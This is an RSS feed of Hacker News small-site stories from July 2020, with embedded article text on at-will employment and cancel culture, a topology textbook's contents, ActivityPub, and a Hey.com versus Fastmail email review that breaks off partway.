<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>
<![CDATA[Hacker News - Small Sites - Score >= 20]]>
        </title>
        <description>
<![CDATA[Hacker News stories from domains that aren't in the top 1M and that have a score of at least 20. Updated nightly via https://github.com/awendland/hacker-news-small-sites]]>
        </description>
        <link>https://news.ycombinator.com</link>
        <generator>RSS for Node</generator>
        <lastBuildDate>Fri, 17 Jul 2020 20:17:47 GMT</lastBuildDate>
        <atom:link href="https://raw.githubusercontent.com/awendland/hacker-news-small-sites/generated/feeds/hn-small-sites-score-20.xml" rel="self" type="application/rss+xml"></atom:link>
        <pubDate>Fri, 17 Jul 2020 20:17:47 GMT</pubDate>
        <language>
<![CDATA[en-US]]>
        </language>
        <managingEditor>
<![CDATA[me@alexwendland.com (Alex Wendland)]]>
        </managingEditor>
        <ttl>240</ttl>
        <item>
            <title>
<![CDATA[A Better Remedy for Cancel Culture]]>
            </title>
            <description>
<![CDATA[
Score 33 | Comments 60 (<a href="https://news.ycombinator.com/item?id=23856918">thread link</a>) | @dgellow
<br/>
July 16, 2020 | https://www.persuasion.community/p/a-better-remedy-for-cancel-culture | <a href="https://web.archive.org/web/*/https://www.persuasion.community/p/a-better-remedy-for-cancel-culture">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><a target="_blank" href="https://cdn.substack.com/image/fetch/c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F9a172446-edcd-47f6-8d44-f467e59ebe25_4000x2223.jpeg"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F9a172446-edcd-47f6-8d44-f467e59ebe25_4000x2223.jpeg" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/9a172446-edcd-47f6-8d44-f467e59ebe25_4000x2223.jpeg&quot;,&quot;height&quot;:809,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:5515692,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/jpeg&quot;,&quot;href&quot;:null}" alt=""></a></p><p>The U.S. Constitution offers very broad protections for freedom of speech. While criticizing the government, or even waving the wrong flag, <a href="https://www.bbc.com/news/world-asia-china-53244862">could get you imprisoned</a> in any territory under Chinese rule, your right to freedom of expression is sacrosanct under the First Amendment‚Äîuntil you step into your place of work, that is. While the government is not entitled to punish political dissent, in most parts of America it is perfectly legal for your boss to fire you if they happen to dislike the person you voted for in the last election. </p><div><p>This restriction on political expression is especially harmful at a time when, nearly every day, somebody is accused of having transgressed against some commonly (or even not so commonly) held taboo. In many of these cases, employees‚Äîfrom senior staff at prominent institutions to working-class laborers‚Äîhave been fired. Even outside of working hours, it would now be perfectly reasonable for most Americans to think twice before speaking their minds about hot-button issues.</p><p> In their attempts to remedy the most pernicious aspects of cancel culture, critics have mostly concentrated on advocating less punitive social norms. This is good as far as it goes. Our political culture will only become more liberal if we all stop demanding that people be punished or fired for imaginary transgressions. Yet, this emphasis on culture ignores the important role that legislative reform could play in defending the most vulnerable: If it were harder for employers to fire people for frivolous reasons, Americans would have less reason to fear that expressing their views might cost them their livelihoods.</p></div><p><strong>The Problem with At-Will Employment</strong></p><p>At the moment, most American workers are subject to ‚Äúat-will‚Äù contracts. As long as their employers do not fire them on the basis of a narrow set of protected characteristics, such as gender, race, and sexual orientation, they can lose their jobs at any time, for any reason. Nor is there a due process requirement: Companies are under no legal obligation to investigate whether the ostensible reasons for axing an employee are grounded in reality. (The only state that categorically prohibits at-will employment, after six months on the job, <a href="https://spoonlaw.com/437-2/">is Montana</a>). </p><div><p> The prevalence of at-will employment makes it easier for employers to engage in knee-jerk reactions to short-lived social media controversies. For instance, a Hispanic electrician working for the San Diego Gas and Electric company was fired for cracking his knuckles in a photograph because a <a href="https://www.nbcsandiego.com/news/local/sdge-worker-fired-over-alleged-racist-gesture-says-he-was-cracking-knuckles/2347414/">social media mob believed that he was</a> flashing a white power sign. The man who took the picture has since admitted that he probably misinterpreted the interaction, and thousands of people have now <a href="https://www.change.org/p/sdge-reinstate-emmanuel-caffertys-job-sdge">signed a petition</a>, asking the electrician‚Äôs former employer to reverse the mistake. But since the employee has already lost his job, it will be hard for him to obtain justice. As in many other cases, both parties would have been better off if the law had required the company to afford due process to an accused worker <em>before</em> deciding whether or not to fire him. </p><p> There is a better alternative: Contracts negotiated by labor unions often provide so-called ‚Äújust cause‚Äù protections for employees. The tests of just cause <a href="https://www.massnurses.org/labor-action/labor-education-resources/grievances-101/just-cause#:~:text=Just%20cause%20is%20the%20standard,must%20be%20just%20and%20fair.&amp;text=The%20concept%20of%20just%20cause%20is%20well%20established%20in%20labor%20law.">typically include questions</a> such as whether the employee was forewarned of the consequences of his or her actions, whether the rules were applied evenly, and whether there was an objective investigation into the employee‚Äôs conduct. In other words, it forces employers to conduct a fair process before firing their employees, which gives the accused a real chance to defend themselves. If we really care about free speech and due process, these protections should be available to every American.</p></div><div><p>Opponents of these reforms have long argued that they would come at a heavy cost to the economy. But scholars who have studied the impact of wrongful discharge protections have obtained mixed results. <a href="https://www.nber.org/papers/w12860.pdf">One 2007 study of U.S. employers</a>, for example, found that the introduction of such protections resulted in some loss of productivity, but also led to strong growth in overall employment numbers.</p></div><p><strong>Stop Employers From Discriminating Against Views They Don‚Äôt Like</strong></p><p> Just cause legislation would help to reduce the number of capricious firings. But, as long as bosses can legally terminate employees because they dislike their political views, such legislation would only go partway towards remedying the chilling effects on free speech. That‚Äôs why those of us who worry about cancel culture should also push for the inclusion of political affiliation in the rubric of anti-discrimination laws. </p><p> The Civil Rights Act has long prohibited employers from discriminating on the basis of race, color, religion, gender, pregnancy, or national origin. In June, the Supreme Court <a href="https://www.npr.org/2020/06/15/863498848/supreme-court-delivers-major-victory-to-lgbtq-employees">ruled that this provision</a> also protects gay, lesbian, and transgender employees. But there are no equivalent federal protections to prevent employees from being disadvantaged because of their political views.</p><div><p>This is a missed opportunity, as the success of local ordinances mandating such protections has shown. In Washington D.C., for example, the <a href="https://ohr.dc.gov/sites/default/files/dc/sites/ohr/publication/attachments/LawsAndRegs-HumanRightsAct-1977-English.pdf">Human Rights Act</a> prohibits employment discrimination based on political affiliation, defined as ‚Äúthe state of belonging to or endorsing any political party.‚Äù As Edgar Njatou, Executive Director of Workplace Fairness, told me in an interview, this ensures that your boss can‚Äôt fire you if they ‚Äúfind out you voted for Hillary or that you‚Äôre a Republican.‚Äù</p><p> Seattle has even more ambitious protections for workers‚Äô political views. Its laws prohibit discrimination based on ‚Äú<a href="https://library.municode.com/wa/seattle/codes/municipal_code?nodeId=TIT14HURI_CH14.06UNPUACPR&amp;showChanges=true">political ideology</a>,‚Äù which is defined as ‚Äúany idea or belief ‚Ä¶ relating to the purpose, conduct, organization, function or basis of government institutions and activities, whether or not characteristic of any political party or group.‚Äù But even this law mostly serves to protect people with relatively common political views. After the 2016 election, for example, local rental listings began to discourage Trump supporters from applying. ‚ÄúIf you are a landlord,‚Äù city government spokesperson Elliot Bronstein, <a href="https://www.king5.com/article/news/local/seattle/no-trump-clause-is-new-requirement-for-some-seattle-renters/416269805">wrote in response</a>, ‚Äúyou cannot discriminate on political status.‚Äù (Like other protections against discrimination, this does not apply to housemates, who share an apartment or living space.) </p></div><p>There are two obvious objections‚Äîboth of which could easily be addressed. First, some organizations have a legitimate interest in ensuring that their employees share a broad worldview: It would make no sense, for example, to stop a political campaign group from discriminating against a job applicant who opposes the organization‚Äôs goals. Explicitly political organizations should therefore enjoy a carve-out from the stricture against discriminating on the basis of political beliefs (though they would still have to afford existing employees the due process protections guaranteed under ‚Äújust cause‚Äù provisions). </p><p>Second, employers have a legitimate interest in protecting their staff from the hateful conduct of colleagues: Clearly, for example, no member of an ethnic minority should have to endure racist taunts at their place of work. But this could also be addressed through carefully worded legislation. Seattle already offers exemptions for political conduct that would cause ‚Äúsubstantial and material disruption of the property rights of the provider of a place of public accommodation.‚Äù Employers also have an affirmative obligation to protect employees from racist harassment.</p><p>Balancing competing goods is one of the core purposes of any legal system. There is no reason to think that our laws could not protect the speech of political minorities, without hampering the operation of overtly political organizations or burdening ethnic, religious, or sexual minorities with the fear of harassment.</p><p><strong>We Can Make It Happen</strong></p><p>New employment regulations always face an especially tough uphill battle in Congress. But, though it will not be easy to win legislative approval for such reforms, every major faction of American political life has its own reasons for supporting them. </p><p>The left should be sympathetic to the wish to expand job protections for American workers, which lag significantly behind those of other developed countries. While conservatives are usually hostile to such regulations, they should recognize that these reforms would help to protect them against the growing influence of cancel culture. And philosophical liberals‚Äîthose of us who believe in a pluralistic society that encourages ideological diversity‚Äîhave the most principled reason to get on board.</p><p>Hatred of any form of wrong think now <a href="https://www.vox.com/2015/12/7/9790764/partisan-discrimination">threatens the foundations</a> of our social fabric. Since the stakes of public policy debates are high, it is understandable‚Äîand even admirable‚Äîfor citizens to subject each other‚Äôs views to vigorous criticism. But, if ordinary people fear that a minor misunderstanding or a deeply held difference of opinion might cost them their jobs, freedom of speech‚Äîthe cornerstone of any liberal order‚Äîis under serious threat. </p></div></div>]]>
            </description>
            <link>https://www.persuasion.community/p/a-better-remedy-for-cancel-culture</link>
            <guid isPermaLink="false">hacker-news-small-sites-23856918</guid>
            <pubDate>Thu, 16 Jul 2020 08:19:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Topology Illustrated (2015)]]>
            </title>
            <description>
<![CDATA[
Score 97 | Comments 10 (<a href="https://news.ycombinator.com/item?id=23854329">thread link</a>) | @Koshkin
<br/>
July 15, 2020 | https://calculus123.com/wiki/Topology_Illustrated | <a href="https://web.archive.org/web/*/https://calculus123.com/wiki/Topology_Illustrated">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="mw-content-text" lang="en" dir="ltr"><div><p><a href="https://calculus123.com/wiki/File:Front_cover.png"><img alt="Front cover.png" src="https://calculus123.com/images/thumb/a/ab/Front_cover.png/250px-Front_cover.png" width="250" height="361" srcset="https://calculus123.com/images/thumb/a/ab/Front_cover.png/375px-Front_cover.png 1.5x, https://calculus123.com/images/a/ab/Front_cover.png 2x" data-file-width="386" data-file-height="557"></a></p>
<p><i>Topology Illustrated</i> by <a href="https://calculus123.com/wiki/Peter_Saveliev" title="Peter Saveliev">Peter Saveliev</a>
</p><p>Contains 1000 illustrations.
</p><p>Sold on <a rel="nofollow" href="http://www.amazon.com/dp/1495188752">Amazon.com</a>. If you are an instructor considering using the book for your class, contact me about a copy.
</p><p>Below are some sections of an early online draft (11/15/2015). Because of the extensive editing that had happened prior to publication, some of the sections had to be omitted.
</p><p>A bird's-eye view of discrete calculus is given in Chapter 4. I recently created an article <a rel="nofollow" href="https://en.wikipedia.org/wiki/Discrete_calculus">‚ÄúDiscrete calculus‚Äù for Wikipedia</a>. It‚Äôll need a lot of work. 
</p><p>If you have any questions, please email me or try the <a rel="nofollow" href="http://facebook.com/topologybook/">facebook page</a> (until a better place is found).
</p><p><b>CONTENTS</b>
</p><p><br>
<a href="https://calculus123.com/wiki/Preface" title="Preface">Preface</a> 1
</p>
<div><p><a href="https://calculus123.com/wiki/File:Tunnels_in_foam.png"><img alt="Tunnels in foam.png" src="https://calculus123.com/images/thumb/a/aa/Tunnels_in_foam.png/220px-Tunnels_in_foam.png" width="220" height="120" srcset="https://calculus123.com/images/a/aa/Tunnels_in_foam.png 1.5x" data-file-width="275" data-file-height="150"></a></p>
<p><b>Chapter 1. Cycles</b>
</p>
<ol><li><a href="https://calculus123.com/wiki/Topology" title="Topology">Topology around us</a> 13</li>
<li><a href="https://calculus123.com/wiki/Homology_classes" title="Homology classes">Homology classes</a> 15</li>
<li><a href="https://calculus123.com/wiki/Topology_of_graphs" title="Topology of graphs">Topology of graphs</a> 12</li>
<li><a href="https://calculus123.com/wiki/Homology_groups_of_graphs" title="Homology groups of graphs">Homology groups of graphs</a> 19</li>
<li><a href="https://calculus123.com/wiki/Maps_of_graphs" title="Maps of graphs">Maps of graphs</a> 19</li>
<li>Binary calculus on graphs 11</li></ol>
</div>
<div><p><a href="https://calculus123.com/wiki/File:Topology_convergent_sequence.png"><img alt="Topology convergent sequence.png" src="https://calculus123.com/images/thumb/1/18/Topology_convergent_sequence.png/200px-Topology_convergent_sequence.png" width="200" height="163" srcset="https://calculus123.com/images/1/18/Topology_convergent_sequence.png 1.5x" data-file-width="245" data-file-height="200"></a></p>
<p><b>Chapter 2. Topologies</b>
</p>
<ol><li><a href="https://calculus123.com/wiki/A_new_look_at_continuity" title="A new look at continuity">A new look at continuity</a> 10</li>
<li><a href="https://calculus123.com/wiki/Neighborhoods_and_topologies" title="Neighborhoods and topologies">Neighborhoods and topologies</a> 13</li>
<li><a href="https://calculus123.com/wiki/Topological_spaces" title="Topological spaces">Topological spaces</a> 15</li>
<li><a href="https://calculus123.com/wiki/Continuous_functions" title="Continuous functions">Continuous functions</a> 24</li>
<li>Subspaces 20</li></ol>
</div>
<div><p><a href="https://calculus123.com/wiki/File:Cube_with_holes.png"><img alt="Cube with holes.png" src="https://calculus123.com/images/5/54/Cube_with_holes.png" width="200" height="205" data-file-width="146" data-file-height="150"></a></p>
<p><b>Chapter 3. Complexes</b> 
</p>
<ol><li><a href="https://calculus123.com/wiki/The_algebra_of_cells" title="The algebra of cells">The algebra of cells</a> 19</li>
<li>Cubical complexes 19</li>
<li><a href="https://calculus123.com/wiki/The_algebra_of_oriented_cells" title="The algebra of oriented cells">The algebra of oriented cells</a> 14</li>
<li>Simplicial complexes 19</li>
<li>Simplicial homology 19</li>
<li><a href="https://calculus123.com/wiki/Simplicial_maps" title="Simplicial maps">Simplicial maps</a> 22</li>
<li><a href="https://calculus123.com/wiki/Parametric_complexes" title="Parametric complexes">Parametric complexes</a> 14</li></ol>
</div>
<div><p><a href="https://calculus123.com/wiki/File:View_through_quotient_door_manifold_1.png"><img alt="View through quotient door manifold 1.png" src="https://calculus123.com/images/thumb/2/21/View_through_quotient_door_manifold_1.png/170px-View_through_quotient_door_manifold_1.png" width="170" height="230" srcset="https://calculus123.com/images/2/21/View_through_quotient_door_manifold_1.png 1.5x" data-file-width="185" data-file-height="250"></a></p>
<p><b>Chapter 4. Spaces</b>
</p>
<ol><li><a href="https://calculus123.com/wiki/Compact_spaces" title="Compact spaces">Compacta</a> 12</li>
<li><a href="https://calculus123.com/wiki/Quotients" title="Quotients">Quotients</a> 20</li>
<li>Cell complexes 24</li>
<li><a href="https://calculus123.com/wiki/Triangulations" title="Triangulations">Triangulations</a> 16</li>
<li><a href="https://calculus123.com/wiki/Manifolds" title="Manifolds">Manifolds</a> 29</li>
<li>Products 29</li></ol>
</div>
<div><p><a href="https://calculus123.com/wiki/File:Algebra_of_spheres.png"><img alt="Algebra of spheres.png" src="https://calculus123.com/images/thumb/3/3d/Algebra_of_spheres.png/220px-Algebra_of_spheres.png" width="220" height="131" srcset="https://calculus123.com/images/3/3d/Algebra_of_spheres.png 1.5x" data-file-width="251" data-file-height="150"></a></p>
<p><b>Chapter 5. Maps</b>
</p>
<ol><li><a href="https://calculus123.com/wiki/Homotopy" title="Homotopy">Homotopy</a> 27</li>
<li><a href="https://calculus123.com/wiki/Cell_maps" title="Cell maps">Cell maps</a> 26</li>
<li>Maps of polyhedra 29</li>
<li><a href="https://calculus123.com/wiki/Euler_and_Lefschetz_numbers" title="Euler and Lefschetz numbers">The Euler and Lefschetz numbers</a> 18</li>
<li>Set-valued maps 15</li></ol>
</div>
<div><p><a href="https://calculus123.com/wiki/File:Forms_as_functions_dim_2.png"><img alt="Forms as functions dim 2.png" src="https://calculus123.com/images/thumb/3/36/Forms_as_functions_dim_2.png/300px-Forms_as_functions_dim_2.png" width="300" height="85" srcset="https://calculus123.com/images/thumb/3/36/Forms_as_functions_dim_2.png/450px-Forms_as_functions_dim_2.png 1.5x, https://calculus123.com/images/thumb/3/36/Forms_as_functions_dim_2.png/600px-Forms_as_functions_dim_2.png 2x" data-file-width="704" data-file-height="200"></a></p>
<p><b>Chapter 6. Forms</b>
</p>
<ol><li><a href="https://calculus123.com/wiki/Discrete_forms_and_cochains" title="Discrete forms and cochains">Discrete forms and cochains</a> 21</li>
<li><a href="https://calculus123.com/wiki/Calculus_on_cubical_complexes" title="Calculus on cubical complexes">Calculus on cubical complexes</a> 23</li>
<li><a href="https://calculus123.com/wiki/Cohomology" title="Cohomology">Cohomology</a> 25</li>
<li>Metric tensor 27</li></ol>
</div>

<div><p><a href="https://calculus123.com/wiki/File:Waves_2d.png"><img alt="Waves 2d.png" src="https://calculus123.com/images/thumb/8/81/Waves_2d.png/250px-Waves_2d.png" width="250" height="186" srcset="https://calculus123.com/images/thumb/8/81/Waves_2d.png/375px-Waves_2d.png 1.5x, https://calculus123.com/images/8/81/Waves_2d.png 2x" data-file-width="403" data-file-height="300"></a></p>
<p><b>Chapter 7. Flows</b>
</p>
<ol><li><a href="https://calculus123.com/wiki/Geometric_complexes" title="Geometric complexes">Metric complexes</a> 12</li>
<li><a href="https://calculus123.com/wiki/ODEs" title="ODEs">ODEs</a> 29</li>
<li>PDEs 24</li>
<li>Social choice 26</li></ol>
</div>

<ul><li>Appendix: <a href="https://calculus123.com/wiki/Notation" title="Notation">Notation</a> 4</li>
<li>Appendix: <a href="https://calculus123.com/wiki/Student%27s_guide_to_proof_writing" title="Student's guide to proof writing">Student's guide to proof writing</a> 3</li>
<li><a href="https://calculus123.com/wiki/Topology_Illustrated_--_Index" title="Topology Illustrated -- Index">Index</a></li></ul><ul><li>Link: <a href="https://calculus123.com/wiki/Spreadsheets" title="Spreadsheets">Spreadsheets</a></li>
<li>Link: <a href="https://calculus123.com/wiki/Topology_Illustrated_--_Errata" title="Topology Illustrated -- Errata">Errata</a></li>
<li>Link: <a href="https://calculus123.com/wiki/Topology_Illustrated_--_Addenda" title="Topology Illustrated -- Addenda">Addenda</a></li>
<li>Addendum: <a href="https://calculus123.com/wiki/The_political_spectrum_is_a_circle" title="The political spectrum is a circle">The political spectrum is a circle</a></li>
<li>Addendum: <a href="https://calculus123.com/wiki/Integer-valued_calculus" title="Integer-valued calculus">Integer-valued calculus</a></li></ul><p></p>

<!-- 
NewPP limit report
Cached time: 20200717104516
Cache expiry: 86400
Dynamic content: false
CPU time usage: 0.032 seconds
Real time usage: 0.032 seconds
Preprocessor visited node count: 1/1000000
Preprocessor generated node count: 4/1000000
Post‚Äêexpand include size: 0/2097152 bytes
Template argument size: 0/2097152 bytes
Highest expansion depth: 1/40
Expensive parser function count: 0/100
Unstrip recursion depth: 0/20
Unstrip post‚Äêexpand size: 0/5000000 bytes
-->
<!--
Transclusion expansion time report (%,ms,calls,template)
100.00%    0.000      1 -total
-->

<!-- Saved in parser cache with key yeahuaftgb:pcache:idhash:525-0!canonical and timestamp 20200717104516 and revision id 7218
 -->
</div></div></div>]]>
            </description>
            <link>https://calculus123.com/wiki/Topology_Illustrated</link>
            <guid isPermaLink="false">hacker-news-small-sites-23854329</guid>
            <pubDate>Thu, 16 Jul 2020 00:35:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[ActivityPub Could Be the Future]]>
            </title>
            <description>
<![CDATA[
Score 107 | Comments 53 (<a href="https://news.ycombinator.com/item?id=23852036">thread link</a>) | @Kye
<br/>
July 15, 2020 | https://kyefox.com/2020/04/09/activitypub-could-be-the-future/ | <a href="https://web.archive.org/web/*/https://kyefox.com/2020/04/09/activitypub-could-be-the-future/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-content" role="main">

	
<article id="post-19">

	
<!-- .entry-header -->

	<div>

		<div>

			
<p>I‚Äôll admit, I‚Äôve spent the last several years disillusioned with technology. All the quirky little tools people made gave way to ad-fueled companies that refused to play well with others.</p>



<p>This is the first time I‚Äôve been excited for a new technology in memory.</p>



<p>ActivityPub is to HTTP what HTTP was to TCP/IP. TCP/IP bridged disparate systems and allowed them to communicate reliably. HTTP allowed the various services built on TCP/IP to communicate with each other reliably.</p>



<p>ActivityPub goes one step further and provides a way for users on those services to communicate in a way that has the appearance of directness. I can follow, for example, Blender‚Äôs videos on PeerTube from my Mastodon account. Or I can use a blog platform that speaks ActivityPub and let people follow it from other services. It‚Äôs all the best features of Twitter with the flexibility of RSS. And unlike Twitter, your Mastodon profile will probably never lose its RSS feed in a company‚Äôs pursuit of profit. The main project already funds itself through Patreon, as do most of the larger instances.</p>



<p>It‚Äôs still early. We could be looking at a situation like Usenet and Gopher where neither ended up being The Thing because AOL soaked up the nascent public internet, then Facebook soaked up the nascent commercial web.</p>



<p>Right now the popularity of Mastodon carries ActivityPub while projects like Plume (blogging), Pixelfed (image sharing), and others work toward their potential.</p>



<p>I have noticed a tendency for people supporting older, similar protocols to wonder why ActivityPub got so popular while their own stagnated. We could speculate. If people knew Ostatus at all, they understood it as a protocol for making Twitter clones. XMPP spoke XML in an age of JSON, and it was perceived as an instant messenger protocol.</p>



<p>Both focused on liberating people from commercial silos. Mastodon had some press to that effect regarding Twitter, but people on there have come to care less as its native and diverse community grows to a self-sufficient level.</p>



<p>Twitter and Facebook are struggling to cope with their place in a massive cultural shift and shaky transfer of generational power. As I write this, Facebook has just lost 25% of its share price on the announcement that it expects weak growth.</p>



<p>I think the growing ActivityPub federation has a good chance. No one interacts with my tweets anymore. Meanwhile, I get response <a href="https://tech.lgbt/@Kye">on Mastodon</a> that reminds me of the early days of Twitter, before they betrayed their developer community and hired a legion of people to cut ad deals.</p>

		</div><!-- .entry-content -->

	</div><!-- .post-inner -->

	<!-- .section-inner -->

	
	<!-- .pagination-single -->

	
		<!-- .comments-wrapper -->

		
</article><!-- .post -->

</div></div>]]>
            </description>
            <link>https://kyefox.com/2020/04/09/activitypub-could-be-the-future/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23852036</guid>
            <pubDate>Wed, 15 Jul 2020 21:21:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Hey.com vs. Fastmail. A Review]]>
            </title>
            <description>
<![CDATA[
Score 38 | Comments 9 (<a href="https://news.ycombinator.com/item?id=23850899">thread link</a>) | @afcapel
<br/>
July 15, 2020 | https://codepatterns.org/2020/7/15/hey-vs-fastmail | <a href="https://web.archive.org/web/*/https://codepatterns.org/2020/7/15/hey-vs-fastmail">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <div>
  <div>
<action-text-attachment sgid="BAh7CEkiCGdpZAY6BkVUSSI1Z2lkOi8vYmxvZ2xpbmUvQWN0aXZlU3RvcmFnZTo6QmxvYi82OD9leHBpcmVzX2luBjsAVEkiDHB1cnBvc2UGOwBUSSIPYXR0YWNoYWJsZQY7AFRJIg9leHBpcmVzX2F0BjsAVDA=--424408285a076431e8df0c1bbae2a130dcefdbef" content-type="image/png" url="https://blogline.co/rails/active_storage/blobs/redirect/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBTUT09IiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--c8b9975582b815c2c2153f050ab1a9612f0505e1/hey.png" filename="hey.png" filesize="15112" width="301" height="163" previewable="true" presentation="gallery"><figure>
    <img src="https://codepatterns.org/rails/active_storage/representations/redirect/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBTUT09IiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--c8b9975582b815c2c2153f050ab1a9612f0505e1/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaDdCam9VY21WemFYcGxYM1J2WDJ4cGJXbDBXd2RwQWdBRWFRSUFBdz09IiwiZXhwIjpudWxsLCJwdXIiOiJ2YXJpYXRpb24ifX0=--61a3794242454801dbe4080bd2ea30c0627ce081/hey.png">

  <figcaption>
  </figcaption>
</figure></action-text-attachment><p>I've been a fanboy of DHH and Jason of <a href="https://basecamp.com/">Basecamp</a> since around 2006 when I first read <a href="https://basecamp.com/gettingreal">Getting Real</a> and started writing code in <a href="https://rubyonrails.org/">Rails</a>. We used Basecamp (and for a brief time, Highrise) as our primary communication tool for the first few years of <a href="https://freeagent.com/">FreeAgent</a> and it was a big influence from a product point of view. For the past 8 years though, I've not really used Basecamp products but I have remained a follower of the company and founders, reading their books and enjoying their Twitter rants. I'm still an ardent Rails fan as well ‚Äì I rarely code at work these days so I built an app for this blog during lockdown to scratch that particular itch üë®‚Äçüíª&nbsp;</p><p>When I heard about HEY, I was immediately interested. Not because I've lost control of my inbox (I'm an order-freak and avid filterer so my inbox is generally a tranquil place), but because the HEY statement about why "Email‚Äôs a treasure" rang so true to me and because a brand-new, Rails-based, Basecamp product is always going to be pretty exciting to try.</p><p>I got my invite early and I've been kicking the tyres for a while, so I've written up a few thoughts to get them out there and to hear about what other people think.&nbsp;</p></div><div>
<p>I've been using email for 28 years. I got my first email account back in 1992 when I started university and I rarely received any email from what I can remember. I probably got the odd message from tutors, but during uni my online communication was largely centred on <a href="https://en.wikipedia.org/wiki/Internet_Relay_Chat">IRC</a>. Remember that?</p><p>On leaving university I didn't use email for a while. I got my first job via a <a href="https://en.wikipedia.org/wiki/Usenet">Usenet</a> forum so I must have used email for that, but it wasn't until the arrival of Hotmail a year or two later that I had my first 'permanent' email address and could access it anywhere (still a limited choice in 1996!). I got my first work email with my second job and then I moved on from Hotmail to Yahoo and stuck that out until 2003 when Gmail launched (and after Yahoo inexplicably deleted all my email by accident).&nbsp;</p><p>I stayed happily with Google until 2015 when I moved over to Fastmail so I could use my own domain and pay for a proper email product and not be the product myself. I still use Gmail (via G Suite) for work though.</p></div><div><p>With the arrival of HEY, I loved the privacy-first focus (no more 'spy trackers') and the new workflows (Set Aside, Focus and Reply etc) sounded great. <a href="https://www.youtube.com/watch?v=UCeYTysLyGI">Jason's demo</a> was compelling. I'm fascinated by what they've achieved with modern Rails and Javascript, the simplicity of the front-end code and speed of it all really is a triumph.&nbsp;</p><p>However once I got invited, the reality of using it has been something of a mixed bag of utter delight with some frustrations. Let's dig into it.</p></div><div>
<p><strong>Focus and Reply<br></strong>This is a headline feature and it's really very good. Flag your emails 'Reply Later' as you're reading your new mails and stack them up for dealing with later. When you're ready, Focus and Reply lets you hammer through them all at once from a single screen. It's a brilliant workflow.</p><action-text-attachment content-type="image" url="https://hey.com/assets/how-it-works/reply-mode-60e4b5c00da627a4738e055d295e13d848d4ecdd806aad1e7bbec4a8ac0d8c32.png" width="1800" height="1871"><figure>
  <img width="1800" height="1871" src="https://hey.com/assets/how-it-works/reply-mode-60e4b5c00da627a4738e055d295e13d848d4ecdd806aad1e7bbec4a8ac0d8c32.png">
</figure></action-text-attachment></div><p><strong>Spy Tracking</strong></p><div><p>I think the Spy Tracker support is brilliant and should become the standard in all email apps. Perhaps it will. I actually emailed Fastmail about this and their reply was pretty interesting:</p></div><blockquote>
<em>We've blocked remote images from loading by default for years: </em><a href="https://codepatterns.org/help/receive/remotecontent.html?u=90cc41d3"><em>https://www.fastmail.com/help/receive/remotecontent.html</em></a><em>.&nbsp;<p>And if you do enable remote loading of images for your known contacts, or you just enable it for a single message, then our servers proxy the images, so all the sender can know is details about our hosts and nothing about you.&nbsp;</p></em>
</blockquote><div><p>So, actually, Fastmail are pretty much doing the same thing other than alerting you to the fact that emails are using SendGrid or whatever?</p></div><p><strong>Clips</strong></p><div>
<action-text-attachment sgid="BAh7CEkiCGdpZAY6BkVUSSI1Z2lkOi8vYmxvZ2xpbmUvQWN0aXZlU3RvcmFnZTo6QmxvYi82Nj9leHBpcmVzX2luBjsAVEkiDHB1cnBvc2UGOwBUSSIPYXR0YWNoYWJsZQY7AFRJIg9leHBpcmVzX2F0BjsAVDA=--f578e07426594da0be890653bf7f777793a7bf5e" content-type="image/png" url="https://blogline.co/rails/active_storage/blobs/redirect/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBSdz09IiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--4dec03929599d3bbb986fd57dfd158ad4bc935d6/image.png" filename="image.png" filesize="48780" width="611" height="209" previewable="true" presentation="gallery"><figure>
    <img src="https://codepatterns.org/rails/active_storage/representations/redirect/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBSdz09IiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--4dec03929599d3bbb986fd57dfd158ad4bc935d6/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaDdCam9VY21WemFYcGxYM1J2WDJ4cGJXbDBXd2RwQWdBRWFRSUFBdz09IiwiZXhwIjpudWxsLCJwdXIiOiJ2YXJpYXRpb24ifX0=--61a3794242454801dbe4080bd2ea30c0627ce081/image.png">

  <figcaption>
  </figcaption>
